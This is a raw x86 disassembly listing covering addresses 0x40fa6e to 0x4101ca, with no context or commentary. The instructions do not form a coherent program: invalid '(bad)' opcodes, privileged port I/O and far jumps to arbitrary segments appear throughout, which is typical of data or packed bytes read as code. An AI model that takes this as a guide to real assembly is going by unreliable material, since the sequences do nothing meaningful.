  40fa6e:	loop   0x40fa10
  40fa70:	aaa    
  40fa71:	in     eax,0xac
  40fa73:	inc    edx
  40fa74:	push   esp
  40fa75:	loopne 0x40fa80
  40fa77:	mov    dh,0x4f
  40fa79:	pop    es
  40fa7a:	sbb    eax,0xc34621db
  40fa7f:	jno    0x40fa9c
  40fa81:	data16 outs dx,BYTE PTR ds:[esi]
  40fa83:	pop    ecx
  40fa84:	jle    0x40fa96
  40fa86:	fs pop ebx
  40fa88:	inc    eax
  40fa89:	push   es
  40fa8a:	jmp    0x40fa5d
  40fa8c:	lea    esi,[edi]
  40fa8e:	ins    DWORD PTR es:[edi],dx
  40fa8f:	test   DWORD PTR ds:0x3855903a,esp
  40fa95:	mov    edx,0xc88e4ccb
  40fa9a:	mov    al,ch
  40fa9c:	dec    ebp
  40fa9d:	inc    esp
  40fa9e:	imul   DWORD PTR [esp+edi*2+0x4a]
  40faa2:	arpl   WORD PTR [esi],cx
  40faa4:	adc    BYTE PTR [ebx+0x1e32f139],0xa5
  40faab:	ja     0x40fa33
  40faad:	dec    ebp
  40faae:	sbb    DWORD PTR [ebp+0x2ed0a2c5],edi
  40fab4:	and    edx,DWORD PTR [edi-0x69]
  40fab7:	sbb    DWORD PTR [esp+0xb],esi
  40fabb:	pushf  
  40fabc:	dec    edx
  40fabd:	rol    edx,0xb9
  40fac0:	jmp    0x40fb1f
  40fac2:	inc    esp
  40fac3:	or     DWORD PTR [eax],ebx
  40fac5:	dec    edx
  40fac6:	scas   al,BYTE PTR es:[edi]
  40fac7:	or     DWORD PTR [ecx+0x7e],edx
  40faca:	test   DWORD PTR [edx+0xe3fd332],0x5a966076
  40fad4:	repnz int3 
  40fad6:	fidiv  DWORD PTR [ebx-0x5bbd340]
  40fadc:	call   0x4f81:0x124bdbc7
  40fae3:	mov    esi,?
  40fae5:	jp     0x40fae3
  40fae7:	mov    ?,edi
  40fae9:	jle    0x40fb10
  40faeb:	int    0x89
  40faed:	sbb    al,0xdc
  40faef:	inc    esi
  40faf0:	mov    al,0x0
  40faf2:	stos   BYTE PTR es:[edi],al
  40faf3:	jle    0x40fa81
  40faf5:	sbb    ecx,edx
  40faf7:	lock inc edi
  40faf9:	ss cmc 
  40fafb:	inc    edi
  40fafc:	jg     0x40fb12
  40fafe:	shr    DWORD PTR gs:[edx],cl
  40fb01:	fistp  DWORD PTR [edx+0x52084bf6]
  40fb07:	aaa    
  40fb08:	test   al,0xd8
  40fb0a:	gs xor dh,BYTE PTR es:[ecx*4-0x2ee08788]
  40fb13:	aam    0x6
  40fb15:	mov    ebp,0x3032a1e8
  40fb1a:	test   al,0x83
  40fb1c:	mov    eax,0x39d3d37f
  40fb21:	sbb    eax,0xece646a0
  40fb26:	data16 aad 0x44
  40fb29:	pop    es
  40fb2a:	xor    BYTE PTR [eax+0x355018c5],ch
  40fb30:	test   BYTE PTR [edi],dh
  40fb32:	mov    ah,0x2e
  40fb34:	gs jbe 0x40fac3
  40fb37:	test   eax,0x173e111c
  40fb3c:	adc    BYTE PTR [ecx],ch
  40fb3e:	bound  edx,QWORD PTR [edx+0x35]
  40fb41:	push   eax
  40fb42:	inc    edx
  40fb43:	jne    0x40fba9
  40fb45:	add    ebp,DWORD PTR [esi+0xff8d355]
  40fb4b:	dec    edx
  40fb4c:	mov    cl,BYTE PTR [edi+0x42]
  40fb4f:	sbb    ebx,ecx
  40fb51:	jle    0x40fb4c
  40fb53:	call   0xb8c918d9
  40fb58:	leave  
  40fb59:	add    edi,DWORD PTR [ebp+0x7f8d6209]
  40fb5f:	retf   0x708f
  40fb62:	les    ebp,FWORD PTR [ecx]
  40fb64:	iretw  
  40fb66:	dec    eax
  40fb67:	stos   BYTE PTR es:[edi],al
  40fb68:	std    
  40fb69:	(bad)  
  40fb6a:	rol    esi,1
  40fb6c:	std    
  40fb6d:	in     eax,0x2b
  40fb6f:	pop    ss
  40fb70:	daa    
  40fb71:	xlat   BYTE PTR ds:[ebx]
  40fb72:	js     0x40fb96
  40fb74:	mov    esp,0x5a9128ab
  40fb79:	xchg   BYTE PTR [eax-0x30465cc9],cl
  40fb7f:	mov    dl,0x66
  40fb81:	clc    
  40fb82:	adc    DWORD PTR [eax+0x2adeb5b6],eax
  40fb88:	cmc    
  40fb89:	imul   esi,DWORD PTR [edi+0x15],0x7bfc6abc
  40fb90:	ret    0xaab3
  40fb93:	xchg   esp,eax
  40fb94:	int3   
  40fb95:	ret    0xea
  40fb98:	push   esp
  40fb99:	mov    WORD PTR ds:0x5ef31e4e,?
  40fb9f:	call   0xa9848c9
  40fba4:	daa    
  40fba5:	xchg   DWORD PTR [eax+0x623524e3],eax
  40fbab:	jo     0x40fc1d
  40fbad:	xor    al,0x8b
  40fbaf:	mov    ds:0x5f0bd1cb,al
  40fbb4:	out    0x31,al
  40fbb6:	or     eax,0x920b099d
  40fbbb:	jge    0x40fb9c
  40fbbd:	and    eax,0x33584795
  40fbc2:	xchg   BYTE PTR [ebp-0x55],bh
  40fbc5:	pop    ecx
  40fbc6:	test   eax,0xec4d61bf
  40fbcb:	nop
  40fbcc:	xor    esp,DWORD PTR [edx+0x280eb465]
  40fbd2:	pop    esp
  40fbd3:	sahf   
  40fbd4:	ss push eax
  40fbd6:	int3   
  40fbd7:	dec    ecx
  40fbd8:	std    
  40fbd9:	jecxz  0x40fbb1
  40fbdb:	push   esi
  40fbdc:	rcl    DWORD PTR [edx+0x54800b05],0xbe
  40fbe3:	pusha  
  40fbe4:	ins    BYTE PTR es:[edi],dx
  40fbe5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbe7:	(bad)  
  40fbe8:	push   ss
  40fbe9:	fistp  QWORD PTR [esp+edx*2]
  40fbec:	cmp    bl,BYTE PTR ds:0x18f8ccaf
  40fbf2:	leave  
  40fbf3:	inc    edx
  40fbf4:	rol    BYTE PTR [eax],1
  40fbf6:	cmp    DWORD PTR ds:0xed97eb32,ebp
  40fbfc:	ss cwde 
  40fbfe:	stc    
  40fbff:	dec    eax
  40fc00:	cmp    cl,ah
  40fc02:	inc    ebx
  40fc03:	push   esp
  40fc04:	lock cmp edi,eax
  40fc07:	dec    ecx
  40fc08:	int    0x31
  40fc0a:	xor    DWORD PTR [ebp+0x40],ebx
  40fc0d:	dec    edx
  40fc0e:	data16 jg 0x40fc0f
  40fc11:	aad    0x81
  40fc13:	mov    eax,0xe5034473
  40fc18:	add    DWORD PTR [ebp+0x55],ecx
  40fc1b:	out    0xf0,eax
  40fc1d:	mov    dh,0x24
  40fc1f:	jmp    0xfe0d:0xa6cc61c3
  40fc26:	xor    edx,DWORD PTR [esi+ebp*4+0x59]
  40fc2a:	in     eax,dx
  40fc2b:	lahf   
  40fc2c:	mov    ecx,0x4298d5e
  40fc31:	rcl    ch,1
  40fc33:	jbe    0x40fc63
  40fc35:	mov    eax,DWORD PTR [ebp-0x6ca04d59]
  40fc3b:	add    bl,dh
  40fc3d:	mov    al,0xf5
  40fc3f:	add    DWORD PTR [ebp+0x39c44081],edi
  40fc45:	push   0xd3907959
  40fc4a:	sub    al,0x93
  40fc4c:	mov    dh,0xdc
  40fc4e:	mov    eax,0xb317cd89
  40fc53:	and    DWORD PTR [ebx-0x66],eax
  40fc56:	aad    0x31
  40fc58:	fadd   st(7),st
  40fc5a:	in     eax,0x34
  40fc5c:	scas   al,BYTE PTR es:[edi]
  40fc5d:	outs   dx,BYTE PTR ds:[esi]
  40fc5e:	fidiv  WORD PTR [edx+0x7b9f6ee2]
  40fc64:	mov    ah,0x72
  40fc66:	fnclex 
  40fc68:	add    BYTE PTR [ebx-0x5],0x1d
  40fc6c:	aaa    
  40fc6d:	fidiv  DWORD PTR [eax+0x41]
  40fc70:	sub    BYTE PTR [edi-0x8eb0087],0x55
  40fc77:	stos   BYTE PTR es:[edi],al
  40fc78:	popf   
  40fc79:	loop   0x40fc27
  40fc7b:	cwde   
  40fc7c:	adc    ecx,DWORD PTR [edx]
  40fc7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc7f:	rol    DWORD PTR [ebx+0x34],0xd7
  40fc83:	popf   
  40fc84:	xor    DWORD PTR [edx+0x18558b42],ebp
  40fc8a:	jmp    0x1e6a1586
  40fc8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc90:	xchg   esi,eax
  40fc91:	stc    
  40fc92:	out    0xf,al
  40fc94:	out    0x8a,al
  40fc96:	push   esp
  40fc97:	(bad)  
  40fc98:	ss adc eax,0x1d211fbd
  40fc9e:	ret    0x48fb
  40fca1:	je     0x40fc23
  40fca3:	cld    
  40fca4:	out    dx,eax
  40fca5:	and    DWORD PTR ds:0xd6052142,0x18
  40fcac:	test   BYTE PTR [eax+esi*8+0x3f3b9d82],0x97
  40fcb4:	das    
  40fcb5:	fld    QWORD PTR [ecx+0x5e]
  40fcb8:	xor    eax,0xe40832cf
  40fcbd:	lods   al,BYTE PTR ds:[esi]
  40fcbe:	add    BYTE PTR [ebx+0x6f],bh
  40fcc1:	push   0xffffffa7
  40fcc3:	xchg   edi,eax
  40fcc4:	lock das 
  40fcc6:	push   ebx
  40fcc7:	ror    BYTE PTR [ecx+eax*4],1
  40fcca:	mov    dh,0x4a
  40fccc:	mov    esi,0xb5791cb0
  40fcd1:	test   al,0x68
  40fcd3:	mov    edi,0xdcf618d4
  40fcd8:	sub    cl,al
  40fcda:	adc    DWORD PTR [ebx+0x63],esp
  40fcdd:	daa    
  40fcde:	sub    eax,0xcaa079b7
  40fce3:	ja     0x40fd30
  40fce5:	push   ebp
  40fce6:	add    DWORD PTR [eax+0x651bd83],ebp
  40fcec:	cmp    BYTE PTR [eax+0x413bd4ef],dh
  40fcf2:	mov    bh,0x1e
  40fcf4:	mov    al,ds:0x5ba79f50
  40fcf9:	ins    DWORD PTR es:[edi],dx
  40fcfa:	pop    edi
  40fcfb:	neg    ecx
  40fcfd:	jg     0x40fcca
  40fcff:	dec    ebx
  40fd00:	mov    edi,0xec8e23b6
  40fd05:	fidivr WORD PTR [esi-0x3e]
  40fd08:	push   edx
  40fd09:	and    esp,eax
  40fd0b:	push   edi
  40fd0c:	push   edx
  40fd0d:	mov    dh,0xe4
  40fd0f:	xor    ecx,DWORD PTR [esi+0x3f]
  40fd12:	jno    0x40fd68
  40fd14:	aaa    
  40fd15:	popa   
  40fd16:	leave  
  40fd17:	aaa    
  40fd18:	xchg   DWORD PTR [eax+0x4ba01a1],ebp
  40fd1e:	clc    
  40fd1f:	push   edi
  40fd20:	add    DWORD PTR [ebp+0x76734371],ebp
  40fd26:	adc    al,0xcf
  40fd28:	popf   
  40fd29:	inc    ecx
  40fd2a:	out    0x19,eax
  40fd2c:	xor    bh,BYTE PTR [edi]
  40fd2e:	retf   
  40fd2f:	inc    ebp
  40fd30:	sub    ebp,edi
  40fd32:	in     al,0xe6
  40fd34:	mov    ecx,ebp
  40fd36:	pop    edi
  40fd37:	int3   
  40fd38:	int    0xd1
  40fd3a:	ins    BYTE PTR es:[edi],dx
  40fd3b:	or     al,0x7a
  40fd3d:	dec    eax
  40fd3e:	xor    DWORD PTR [edx+0x247f1947],0xdff5a464
  40fd48:	add    eax,0x1a88a26f
  40fd4d:	clc    
  40fd4e:	scas   eax,DWORD PTR es:[edi]
  40fd4f:	cmp    ecx,eax
  40fd51:	xchg   ebp,eax
  40fd52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd53:	(bad)  
  40fd54:	ins    BYTE PTR es:[edi],dx
  40fd55:	sub    eax,0x2a45ba7
  40fd5a:	test   BYTE PTR [eax],al
  40fd5c:	out    0xf2,al
  40fd5e:	loope  0x40fd76
  40fd60:	mov    ebp,0xf28fc8dc
  40fd65:	(bad)  
  40fd66:	xchg   ecx,eax
  40fd67:	jp     0x40fd88
  40fd69:	add    al,0xc8
  40fd6b:	xchg   BYTE PTR [eax],bl
  40fd6d:	jnp    0x40fdd3
  40fd6f:	jb     0x40fd45
  40fd71:	mov    esi,0x72559511
  40fd76:	mov    ebp,0xe2843c14
  40fd7b:	(bad)  
  40fd7c:	pusha  
  40fd7d:	test   DWORD PTR [edi-0x2cdbe460],eax
  40fd83:	rcl    DWORD PTR [ecx+eax*1-0x3788bcb3],cl
  40fd8a:	neg    BYTE PTR [esp+ecx*8]
  40fd8d:	jge    0x40fd79
  40fd8f:	das    
  40fd90:	jl     0x40fdec
  40fd92:	cli    
  40fd93:	popa   
  40fd94:	es dec esp
  40fd96:	jae    0x40fd6d
  40fd98:	jmp    0x40fd9a
  40fd9a:	mov    ebx,0xd2925883
  40fd9f:	sbb    cl,BYTE PTR [edx+0x68]
  40fda2:	pop    ds
  40fda3:	arpl   WORD PTR [esi],si
  40fda5:	sub    BYTE PTR [edi-0x1ca7bf9a],0x1c
  40fdac:	adc    ebp,eax
  40fdae:	fisttp DWORD PTR [ebp+0x26297d6c]
  40fdb4:	xor    al,0xd4
  40fdb6:	(bad)  
  40fdb7:	fcmovne st,st(2)
  40fdb9:	les    eax,FWORD PTR [edx]
  40fdbb:	and    al,cl
  40fdbd:	(bad)  
  40fdbe:	jmp    0x40fd88
  40fdc0:	mov    dl,0x83
  40fdc2:	fistp  DWORD PTR [ebx+0x4808bd23]
  40fdc8:	(bad)
  40fdcb:	and    ecx,DWORD PTR [edi-0x63]
  40fdce:	inc    eax
  40fdcf:	test   DWORD PTR [esi],esp
  40fdd1:	nop
  40fdd2:	ss jge 0x40fe30
  40fdd5:	push   0xffffffe8
  40fdd7:	rol    DWORD PTR [edi],0x5
  40fdda:	je     0x40fd5e
  40fddc:	int3   
  40fddd:	mov    bh,0xc
  40fddf:	je     0x40fdad
  40fde1:	jg     0x40fe4d
  40fde3:	mov    bh,0x48
  40fde5:	inc    eax
  40fde6:	push   esp
  40fde7:	and    al,0xbd
  40fde9:	cmp    dl,ah
  40fdeb:	dec    esp
  40fdec:	xchg   edi,eax
  40fded:	inc    ebp
  40fdee:	int3   
  40fdef:	js     0x40fe27
  40fdf1:	cmp    DWORD PTR [ecx-0x35],edx
  40fdf4:	mov    cl,0x70
  40fdf6:	mov    al,ds:0x87246075
  40fdfb:	lds    ebp,FWORD PTR [esi+0x3186c320]
  40fe01:	cmp    BYTE PTR [eax+0x14a23057],ch
  40fe07:	pop    ebx
  40fe08:	dec    eax
  40fe09:	push   ss
  40fe0a:	sti    
  40fe0b:	dec    esp
  40fe0c:	jbe    0x40fdbd
  40fe0e:	(bad)  
  40fe0f:	cmp    bl,BYTE PTR [eax-0x6f4d0e4d]
  40fe15:	or     BYTE PTR [ebp-0x63],bh
  40fe18:	aas    
  40fe19:	cmp    DWORD PTR [esi+0x7f7e5ac4],esp
  40fe1f:	adc    bl,bh
  40fe21:	mov    DWORD PTR [eax-0x7101ef30],edi
  40fe27:	sbb    eax,0xa9b81337
  40fe2c:	xor    eax,0x84418afa
  40fe31:	loopne 0x40fe4d
  40fe33:	out    0xe5,al
  40fe35:	jae    0x40fe76
  40fe37:	js     0x40fe82
  40fe39:	not    BYTE PTR [edx]
  40fe3b:	fnsave [eax+0x69]
  40fe3e:	popa   
  40fe3f:	test   dl,ah
  40fe41:	nop
  40fe42:	mov    WORD PTR ss:[ebx+eiz*4+0x65bd18d5],ds
  40fe4a:	add    BYTE PTR [ecx+edi*8-0xb],dl
  40fe4e:	pushf  
  40fe4f:	xchg   ebp,eax
  40fe50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe51:	hlt    
  40fe52:	or     BYTE PTR ds:0x12e31dbd,ah
  40fe58:	mov    edi,0x329164df
  40fe5d:	adc    al,0x1a
  40fe5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe60:	jno    0x40fec8
  40fe62:	add    cl,dh
  40fe64:	loope  0x40fe90
  40fe66:	stos   DWORD PTR es:[edi],eax
  40fe67:	cmp    BYTE PTR [edi+0x3e],ah
  40fe6a:	jmp    DWORD PTR [ecx+0xf]
  40fe6d:	test   al,0xdf
  40fe6f:	jge    0x40febb
  40fe71:	pop    es
  40fe72:	xlat   BYTE PTR ds:[ebx]
  40fe73:	dec    edx
  40fe74:	je     0x40fdfa
  40fe76:	adc    ebp,DWORD PTR ds:0x541ebe84
  40fe7c:	(bad)  
  40fe7d:	cs pop ds
  40fe7f:	loopne 0x40feb8
  40fe81:	or     al,0x2e
  40fe83:	(bad)  
  40fe84:	imul   ecx,ebx,0xffffffcd
  40fe87:	icebp  
  40fe88:	inc    ebp
  40fe89:	in     eax,0x7a
  40fe8b:	icebp  
  40fe8c:	lods   eax,DWORD PTR ds:[esi]
  40fe8d:	mov    ?,WORD PTR [ebp-0x4e]
  40fe90:	retf   0xaead
  40fe93:	(bad)  
  40fe94:	(bad)  
  40fe95:	jge    0x40feb7
  40fe97:	je     0x40fed0
  40fe99:	xor    edi,DWORD PTR [eax-0x445e455c]
  40fe9f:	mov    bh,0x87
  40fea1:	cmp    DWORD PTR [edi-0x17],edx
  40fea4:	sub    al,0x30
  40fea6:	leave  
  40fea7:	jge    0x40fe3c
  40fea9:	and    cl,bl
  40feab:	xchg   ecx,eax
  40feac:	add    al,0xd6
  40feae:	jb     0x40fea3
  40feb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feb1:	fdivr  QWORD PTR [edx-0xa07fc33]
  40feb7:	int3   
  40feb8:	xchg   ecx,eax
  40feb9:	pushf  
  40feba:	push   cs
  40febb:	pop    ds
  40febc:	mov    ds:0xe69f6266,eax
  40fec1:	in     eax,dx
  40fec2:	pop    esi
  40fec3:	jmp    0x1d5371ea
  40fec8:	xchg   ecx,eax
  40fec9:	sbb    eax,0x9009f0bc
  40fece:	add    eax,0x46d57b49
  40fed3:	call   FWORD PTR [edi]
  40fed5:	push   esi
  40fed6:	into   
  40fed7:	and    DWORD PTR [ecx+0x3b],0x24
  40fedb:	nop
  40fedc:	mov    ebp,?
  40fede:	xor    bl,BYTE PTR [edx+0x35]
  40fee1:	mov    al,0x1d
  40fee3:	dec    bx
  40fee5:	cmp    BYTE PTR [edi],bl
  40fee7:	lahf   
  40fee8:	retf   
  40fee9:	or     ch,dl
  40feeb:	xlat   BYTE PTR ds:[ebx]
  40feec:	mov    ebp,0xfcb23781
  40fef1:	add    DWORD PTR [ebp-0x4b],ebx
  40fef4:	jo     0x40ff19
  40fef6:	outs   dx,BYTE PTR ds:[esi]
  40fef7:	test   BYTE PTR [edi+edi*1-0x59],al
  40fefb:	inc    ebp
  40fefc:	xor    esi,DWORD PTR [ebx-0x42be9c1a]
  40ff02:	mov    BYTE PTR [esi+0x4da31102],0xae
  40ff09:	in     eax,0x19
  40ff0b:	gs jne 0x40ff33
  40ff0e:	loopne 0x40fec9
  40ff10:	outs   dx,BYTE PTR ds:[esi]
  40ff11:	lea    esp,[eax+0x21]
  40ff14:	sub    BYTE PTR [esi+edx*4],ah
  40ff17:	xor    edx,0xffffffda
  40ff1a:	ret    0xbc53
  40ff1d:	inc    ebx
  40ff1e:	push   ebp
  40ff1f:	ds lahf 
  40ff21:	push   ecx
  40ff22:	inc    edi
  40ff23:	xor    eax,0xa1740cd4
  40ff28:	inc    esp
  40ff29:	sub    BYTE PTR es:[eax],dl
  40ff2c:	cli    
  40ff2d:	retf   0xd8b8
  40ff30:	aaa    
  40ff31:	jmp    0xbaab:0x6abe14d
  40ff38:	mov    WORD PTR [esi+0x431962a7],cs
  40ff3e:	push   cs
  40ff3f:	xchg   DWORD PTR [ebx+0x4],ecx
  40ff42:	cmp    DWORD PTR [ebx+0x62ff35c2],ebx
  40ff48:	aaa    
  40ff49:	je     0x40ff89
  40ff4b:	test   al,0x63
  40ff4d:	js     0x40ff03
  40ff4f:	adc    eax,0xfb2ca144
  40ff54:	jb     0x40ffd1
  40ff56:	sub    al,0xf7
  40ff58:	mov    ah,BYTE PTR [edx+0x16]
  40ff5b:	push   0x9f003fca
  40ff60:	jae    0x40ffb8
  40ff62:	mov    edx,0x9cda2839
  40ff67:	push   ds
  40ff68:	cli    
  40ff69:	xor    BYTE PTR [esi-0xabbc16b],ch
  40ff6f:	fadd   QWORD PTR [ecx]
  40ff71:	(bad)  
  40ff72:	cmc    
  40ff73:	cmp    BYTE PTR [esi+0x5f9562b3],ah
  40ff79:	pusha  
  40ff7a:	mov    WORD PTR [ebp+0x33],fs
  40ff7d:	xor    DWORD PTR [ebx+eiz*1+0x4893e3f9],0xffffffd9
  40ff85:	jb     0x40ff42
  40ff87:	mov    cl,0x42
  40ff89:	pop    es
  40ff8a:	pop    ebx
  40ff8b:	stos   BYTE PTR es:[edi],al
  40ff8c:	dec    esi
  40ff8d:	repz mov cl,0x57
  40ff90:	mov    gs:0xda582154,eax
  40ff96:	sti    
  40ff97:	mov    al,BYTE PTR [edx-0x5d]
  40ff9a:	or     esi,edi
  40ff9c:	or     ebp,DWORD PTR [ebp-0x40d75777]
  40ffa2:	pop    esi
  40ffa3:	in     eax,dx
  40ffa4:	mov    gs,WORD PTR [eax-0xd]
  40ffa7:	ret    
  40ffa8:	sbb    bl,BYTE PTR [ecx-0x561ebd9]
  40ffae:	or     eax,0xac84b1f4
  40ffb3:	fisubr WORD PTR [eax+edi*4]
  40ffb6:	lahf   
  40ffb7:	sbb    DWORD PTR [edx+0xa573c91],ecx
  40ffbd:	imul   esi,eax,0x47
  40ffc0:	clc    
  40ffc1:	retf   0x263f
  40ffc4:	dec    esp
  40ffc5:	dec    ecx
  40ffc6:	(bad)  
  40ffc7:	in     al,dx
  40ffc8:	retf   
  40ffc9:	mov    BYTE PTR [ecx+0x45],dl
  40ffcc:	cwde   
  40ffcd:	inc    eax
  40ffce:	mov    ecx,0x334c2ae6
  40ffd3:	out    0x6e,al
  40ffd5:	xchg   esi,eax
  40ffd6:	sbb    eax,0x1cee5a50
  40ffdb:	jbe    0x40ff78
  40ffdd:	pop    esp
  40ffde:	mov    ah,dl
  40ffe0:	mov    ds:0xcf999e26,eax
  40ffe5:	fucom  st(7)
  40ffe7:	fdivr  DWORD PTR [ecx]
  40ffe9:	aaa    
  40ffea:	jg     0x40fff3
  40ffec:	inc    ebx
  40ffed:	retf   
  40ffee:	addr16 mov esi,0xb9b4ed36
  40fff4:	push   cs
  40fff5:	dec    ebx
  40fff6:	and    al,0x20
  40fff8:	sub    edx,esp
  40fffa:	fdiv   st,st(0)
  40fffc:	lods   al,BYTE PTR gs:[esi]
  40fffe:	cmp    eax,0x3e913b0d
  410003:	dec    edx
  410004:	out    0x93,eax
  410006:	icebp  
  410007:	jo     0x40ffa7
  410009:	mov    edx,0xff438d76
  41000e:	adc    dl,cl
  410010:	repz sbb al,0xca
  410013:	xchg   edx,eax
  410014:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410015:	push   ss
  410016:	xchg   DWORD PTR ds:0x5caa96bb,esp
  41001c:	mov    esi,0x11c69388
  410021:	addr16 (bad) 
  410023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410024:	sub    BYTE PTR [edi+0x30b38475],cl
  41002a:	pop    ds
  41002b:	test   eax,0x9097a449
  410030:	mov    bh,0x66
  410032:	xor    dh,BYTE PTR [ecx-0xd]
  410035:	inc    edi
  410036:	sub    ch,dh
  410038:	dec    esp
  410039:	jnp    0x40ffc2
  41003b:	cmp    BYTE PTR [ecx],ah
  41003d:	lahf   
  41003e:	adc    ecx,esp
  410040:	sbb    al,0x7b
  410042:	fdiv   DWORD PTR [ecx-0xf]
  410045:	outs   dx,DWORD PTR ds:[esi]
  410046:	inc    edi
  410047:	(bad)  
  410049:	in     al,dx
  41004a:	jge    0x40ffe6
  41004c:	dec    ebx
  41004d:	pop    ds
  41004e:	xor    al,0xf0
  410050:	into   
  410051:	xor    ax,0xab8d
  410055:	jo     0x40fff6
  410057:	inc    edx
  410058:	sub    bl,al
  41005a:	cdq    
  41005b:	loop   0x410056
  41005d:	pushf  
  41005e:	ss out dx,al
  410060:	jge    0x4100b8
  410062:	push   esi
  410063:	xlat   BYTE PTR ds:[ebx]
  410064:	xchg   ebx,eax
  410065:	pop    esp
  410066:	xlat   BYTE PTR ds:[ebx]
  410067:	int3   
  410068:	retf   0x6828
  41006b:	and    edi,esp
  41006d:	sub    edx,DWORD PTR [ebx-0x37c37204]
  410073:	xchg   edx,eax
  410074:	mov    bl,0x5d
  410076:	or     eax,0x3262b81b
  41007b:	push   eax
  41007c:	(bad)  
  41007e:	sti    
  41007f:	xchg   edx,eax
  410080:	aam    0x89
  410082:	or     ah,dl
  410084:	rcr    DWORD PTR [esi-0x2afc4866],0x7f
  41008b:	jge    0x41003d
  41008d:	dec    edx
  41008e:	jns    0x410063
  410090:	call   0xf8f7:0xcf3e0b77
  410097:	lds    ebp,FWORD PTR [edx]
  410099:	xor    dh,BYTE PTR [ecx+0x32]
  41009c:	(bad)  
  41009d:	in     eax,dx
  41009e:	das    
  41009f:	xor    al,dh
  4100a1:	mov    cl,0x73
  4100a3:	fcmovnbe st,st(6)
  4100a5:	cdq    
  4100a6:	in     al,dx
  4100a7:	or     esp,eax
  4100a9:	mov    edi,0x19bc475a
  4100ae:	add    edx,ecx
  4100b0:	aad    0x2
  4100b2:	ja     0x41008a
  4100b4:	push   0xf31fc46
  4100b9:	pushf  
  4100ba:	push   eax
  4100bb:	inc    edi
  4100bc:	inc    ecx
  4100bd:	shr    BYTE PTR [ecx+ebp*8-0x11383303],0x78
  4100c5:	push   es
  4100c6:	jmp    0xd1d624d7
  4100cb:	lahf   
  4100cc:	push   0x9
  4100ce:	rcl    DWORD PTR [ecx+0x69],1
  4100d1:	out    dx,al
  4100d2:	xchg   ebx,eax
  4100d3:	imul   BYTE PTR [ecx]
  4100d5:	pop    edx
  4100d6:	daa    
  4100d7:	fs xchg edi,eax
  4100d9:	add    ecx,edi
  4100db:	imul   ebp,DWORD PTR [ebx+0x59],0x5a8cc25c
  4100e2:	out    dx,al
  4100e3:	ss cmc 
  4100e5:	sub    edx,edx
  4100e7:	icebp  
  4100e8:	(bad)  
  4100e9:	dec    ebp
  4100ea:	jle    0x41008e
  4100ec:	xchg   BYTE PTR [eax],ah
  4100ee:	shl    DWORD PTR cs:[ebx],1
  4100f1:	or     dh,BYTE PTR [ebx+eax*2]
  4100f4:	scas   al,BYTE PTR es:[edi]
  4100f5:	xchg   edx,eax
  4100f6:	jle    0x410136
  4100f8:	sub    BYTE PTR [edx],bl
  4100fa:	out    0xb3,eax
  4100fc:	mov    bl,0x53
  4100fe:	(bad)  
  4100ff:	jp     0x4100b9
  410101:	xor    edi,eax
  410103:	daa    
  410104:	ins    BYTE PTR es:[edi],dx
  410105:	in     eax,0xd4
  410107:	push   ss
  410108:	sbb    edi,DWORD PTR [ecx-0x56]
  41010b:	retf   0x4ecd
  41010e:	je     0x41009a
  410110:	fwait
  410111:	xchg   edi,eax
  410112:	stos   BYTE PTR es:[edi],al
  410113:	jmp    0xd09f:0xb8bf99f1
  41011a:	dec    edx
  41011b:	(bad)  
  41011c:	add    bl,BYTE PTR [esi+0x5ed25bd6]
  410122:	shr    BYTE PTR cs:0x9f957360,1
  410129:	stos   DWORD PTR es:[edi],eax
  41012a:	sar    BYTE PTR [esi],1
  41012c:	fistp  DWORD PTR [edx+0x18ad45f5]
  410132:	xor    eax,0xf0bcef0f
  410137:	adc    eax,0xf9bdc70c
  41013c:	fisub  DWORD PTR [ebp-0x73af5454]
  410142:	xchg   ecx,eax
  410143:	sbb    dl,BYTE PTR [ecx]
  410145:	xchg   BYTE PTR [esi+eiz*2-0x28],bh
  410149:	sbb    ch,BYTE PTR [edx-0x2a13139e]
  41014f:	xor    edi,0xffffff95
  410152:	das    
  410153:	fadd   DWORD PTR [ecx+eiz*8+0x57b576a7]
  41015a:	das    
  41015b:	jecxz  0x410147
  41015d:	int    0x97
  41015f:	or     ebx,DWORD PTR [eax+0x3d]
  410162:	mov    dh,0x92
  410164:	(bad)  
  410165:	jg     0x410134
  410167:	stos   BYTE PTR es:[edi],al
  410168:	push   es
  410169:	jle    0x41011f
  41016b:	jg     0x410157
  41016d:	jo     0x4101cd
  41016f:	out    dx,al
  410170:	mov    ebp,0x335bf462
  410175:	fs (bad) 
  410177:	loop   0x410113
  410179:	mov    al,0x1f
  41017b:	test   DWORD PTR [ebx],ebp
  41017d:	imul   ebx,DWORD PTR [ebx],0xffffffe6
  410180:	daa    
  410181:	pop    DWORD PTR [ecx-0x71]
  410184:	dec    esp
  410185:	iret   
  410186:	cdq    
  410187:	out    0xc9,eax
  410189:	leave  
  41018a:	fcom   DWORD PTR [edi-0x14f135e2]
  410190:	fxch   st(1)
  410192:	jmp    0x41017e
  410194:	aaa    
  410195:	pop    esp
  410196:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410197:	mov    cl,0x64
  410199:	dec    ebx
  41019a:	shl    ah,0x7e
  41019d:	jl     0x4101d0
  41019f:	push   0xffffffde
  4101a1:	stc    
  4101a2:	cdq    
  4101a3:	out    dx,eax
  4101a4:	xchg   ecx,eax
  4101a5:	scas   eax,DWORD PTR es:[edi]
  4101a6:	push   eax
  4101a7:	stos   DWORD PTR es:[edi],eax
  4101a8:	int    0xfd
  4101aa:	mov    esi,0xac023876
  4101af:	lahf   
  4101b0:	ret    0x46fa
  4101b3:	jnp    0x41014b
  4101b5:	mov    bl,0xb3
  4101b7:	bnd jo 0x4101d7
  4101ba:	adc    ebx,DWORD PTR [esp+eiz*4]
  4101bd:	xchg   ebp,eax
  4101be:	aas    
  4101bf:	aam    0xdd
  4101c1:	retf   0xf63b
  4101c4:	adc    dl,dh
  4101c6:	mov    cl,0xb2
  4101c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101c9:	in     al,dx
  4101ca:	arpl   WORD PTR [eax-0x7e21f160],cx
